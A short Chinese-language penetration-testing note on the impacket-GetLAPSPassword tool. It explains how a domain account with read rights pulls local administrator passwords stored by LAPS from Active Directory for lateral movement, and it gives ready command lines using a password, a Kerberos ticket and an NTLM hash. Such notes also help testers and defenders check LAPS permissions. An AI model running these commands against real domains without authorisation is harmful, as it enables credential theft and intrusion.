# impacket-GetLAPSPassword

## 介绍

impacket-GetLAPSPassword是用来从AD里读取LAPS/Windows LAPS存的本地管理员密码的工具。

原理：你有一个域账号->这个账号对某台计算机对象有“读取LAPS密码属性”的权限->你就能把那台机器的本地管理员密码拉出来->横向提权

## 它能读那些属性？

### 1）传统Microsoft LAPS

`ms-Mcs-AdmPwd`：本地管理员明文密码

`ms-Mcs-AdmPwdExpirationTime`：过期时间

### 2）Windows LAPS

常见可能是这些（取决于部署）：

- `msLAPS-Password`
- `msLAPS-PasswordExpirationTime`
- 还有一些加密/历史相关属性（不一定可读）

📌 关键点：**能不能读到，完全看 ACL 授权**（谁被允许读取这些属性）。

## 前置条件

（1）你能 LDAP 绑定到 DC（389/636通）

（2）你有一个域账号（或 Kerberos 票）

（3）你的账号对目标计算机对象拥有读取 LAPS 密码属性的权限（常见是某个 IT/Helpdesk 组）

## 利用

### A）用用户名密码查询

impacket-GetLAPSPassword domain.local/user:'Passw0rd!' -dc-ip 10.10.10.10

### B）只查某一台机器

impacket-GetLAPSPassword domain.local/user:'Passw0rd!' -dc-ip 10.10.10.10 -target HOSTNAME$

### C）用Kerberos

export KRB5CCNAME=/tmp/user.ccache

impacket-GetLAPSPassword -k -no-pass domain.local/user -dc-ip 10.10.10.10

### D）用NTLM Hash

impacket-GetLAPSPassword domain.local/user -hashes :NTHASH -dc-ip 10.10.10.10

### 输出

COMPUTER01:Administrator:PlainTextPasswordHere

## 常见坑

（1）读不到不代表没部署 LAPS：可能你没权限读属性。

（2）LAPS 读取权限经常给的是“组”：你得先确认自己在哪些组。

（3）Windows LAPS vs 旧 LAPS：属性名不一样，工具版本老的话可能只认 ms-Mcs-AdmPwd。

（4）LDAP 被限制：389/636 不通、或要求 LDAPS。